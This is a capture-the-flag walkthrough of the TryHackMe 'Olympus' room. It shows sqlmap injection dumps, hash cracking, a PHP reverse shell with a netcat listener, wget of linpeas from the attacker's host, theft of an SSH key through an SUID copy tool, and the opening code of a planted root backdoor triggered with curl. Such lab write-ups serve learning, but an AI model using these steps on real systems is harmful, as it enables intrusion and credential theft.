Hello and welcome back to another write up. This one is on Tryhackme room called Olympus.
https://tryhackme.com/room/olympusroom 


Lets' start with nmap.
```
Nmap scan report for 10.10.160.117 (10.10.160.117)
Host is up (0.075s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)
|   256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)
|_  256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://olympus.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap shows hostname olympus.thm so we will quickly add it to our ```/etc/hosts``` file with this command:
```
echo "10.10.160.117 olympus.thm" >> /etc/hosts
```
Now it's time to visit the webpage.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_main_page.png?raw=true)

There isn't anything interesting. First thing we will do is run gobuster. 
It shows us webmaster directory.

```
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
```

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_webmaster.png?raw=true)

Upon visiting we see Victor CMS. Searching for exploits reveals that the search field is vulnerable to SQL Injection. 
We capture the request in burpsuite right click and choose save item. Then we run sqlmap with following flags.

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/burp_request_sql_olympus.png)

```
# sqlmap -r r.req --level 5 --risk 3 --batch --dbs                           
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
``` 

Let's see what's in the olympus database. 

```
# sqlmap -r r.req --level 5 --risk 3 --batch -D olympus --tables    

Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+                
```

Now we extract column names from users table(we will also get flag from here using `-T flag --dump` or we can wait and get it once we have shell).
First we check users table.

```
# sqlmap -r r.req --level 5 --risk 3 --batch -D olympus -T users --dump
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9Vp---redacted---cz1qK2EArDvnj3C 
| prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XW---redacted---N3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI---redacted---0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+

```
For some reason it's formatted weirdly but now we posses usernames and password hashes. We can add another host
to our `/etc/hosts` file because we can see root a zeus users having email adresses @chat.olympus.thm .

We will use john the ripper for the cracking of hashes.

```
# john --wordlist=/root/Desktop/rockyou.txt --format=bcrypt hashes.txt
```

Now we can login to the admin panel. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/olympus_admin.png?raw=true)

I tried everything on this page but nothing seems to have any usefull functionality whatsoever.
Time to move on to the chat.olympus.thm. 

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/Tryhackme-Write-Ups/THM-Olympus-Write-Up/images/chat_olympus.png?raw=true)

If we try to login with the prometheus credentials we will log in into the page. We see conversation between
zeus and prometheus about upload functionality. They talk about changing file name when it is uploaded. This would be problem
as we don't know how this is done. But since we have sql injection we can just find our file name. 
I'll upload the classic php reverse shell(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). To find the directory where the files are stored when uploaded
we can either guess or use gobuster/feroxbuster or some other tool to brute force the directory. Either way it is uploads. 
This can be tested by visiting the prometheus file we find with help from sqlmap.

```
# sqlmap -r r.req --level 5 --risk 3 --batch -D olympus -T chats --dump
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+

```

Now visiting `chat.olympus.thm/uploads47c3210d51761686f3af40a875eeaaea.txt`. Proves us right.
After uploading the shell we use sqlmap to find the name of the shell. But nothing returned.
The reason is that sqlmap doesn't update it's queries so we have to add flag `--fresh-queries`.
Now spin up netcat and visit the file and we got connection back.

```
└─# nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.21.94.
Ncat: Connection from 10.10.21.94:50270.
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:07:45 up 19 min,  0 users,  load average: 0.00, 0.11, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
/bin/sh: 0: can't access tty; job control turned off
$ 
which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@olympus:/$ ^Z
zsh: suspended  nc -lvnp 1234
stty raw -echo; fg                                                                                                                                                                                                             148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 1234

www-data@olympus:/$ export TERM=xterm

```

For privilege escalation we will download linpeas from our python server.

```

└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.21.94 - - [14/Oct/2022 18:18:15] "GET /linpeas.sh HTTP/1.1" 200 -

```

```
www-data@olympus:/tmp$ wget http://10.9.11.107/linpeas.sh
--2022-10-14 22:18:15--  http://10.9.11.107/linpeas.sh
Connecting to 10.9.11.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776073 (758K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 757.88K   872KB/s    in 0.9s    

2022-10-14 22:18:16 (872 KB/s) - ‘linpeas.sh’ saved [776073/776073]

www-data@olympus:/tmp$ chmod +x linpeas.sh 
www-data@olympus:/tmp$ ./ linpeas.sh

```

One file that stands out is `/usr/bin/cputils`

```
www-data@olympus:/dev/shm$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: /home/zeus/.ssh/id_rsa

Enter the Name of Target File: /dev/shm/id_rsa

File copied successfully.
www-data@olympus:/dev/shm$ ls -la /dev/shm
drwxrwxrwt  2 root root       80 Oct 15 13:34  .
drwxr-xr-x 19 root root     3920 Oct 15 13:24  ..
-rw-rw-rw-  1 zeus www-data 2655 Oct 15 13:34  id_rsa
```

If we try to use ssh with id_rsa we can't because there is a passphrase. But in our arsenal lies ssh2john and john the ripper so 
let's use them. 

```
# ssh2john id_rsa > id_rsa_hash
# john --wordlist=/root/Desktop/rockyou.txt id_rsa_hash                                  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
---redacted---        (id_rsa)     
1g 0:00:00:43 DONE (2022-10-15 09:41) 0.02320g/s 34.89p/s 34.89c/s 34.89C/s maurice..bunny
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We are successfull and can log in now. 

```
zeus@olympus:~$ id
uid=1000(zeus) gid=1000(zeus) groups=1000(zeus),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
zeus@olympus:~$ ls
snap  user.flag  zeus.txt
```
The note says 
```
Hey zeus !

I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.

```
I remember when doing enumeration for escalating to zeus user that there was a file in `/var/www/html/` that i couldn't access. But I can access it now.
We see webpage(I'm showing only first few lines that are important)
```
 cat VIGQFQFMYOST.php 
<?php
$pass = "a7c5f---redacted---129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];
```

We see that we can get reverse shell easily.

```
# curl -X POST "http://10.10.184.110/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php?ip=MYIP&port=9001" -d "password=a7c5ff---redacted---74129"                

```

Back on our netcat listener we have connection back and shell as root. 

```
# nc -lvnp 9001                                                                                                                                                                                                                        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.184.110.
Ncat: Connection from 10.10.184.110:55186.
Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 15:58:45 up 11 min,  1 user,  load average: 0.00, 0.62, 0.75
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/0    10.9.11.107      15:54    2:37   0.04s  0.04s -bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),7777(web)
```
Now the only thing left to do is to find the bonus flag that is hidden somewhere.
The hint for the bonus flag says that it is in /etc.
With this hint we can use grep to find the flag.
```
root@olympus:/root# grep -irl flag{ /etc
/etc/ssl/private/.b0nus.fl4g
``` 
 
And that's a wrap for this machine. 
Thank you so much for reading this write up. If you have any suggestions, questions or just want to play CTFs with someone reach me out on Twitter or wherever else you can find me. https://twitter.com/Vojtech1337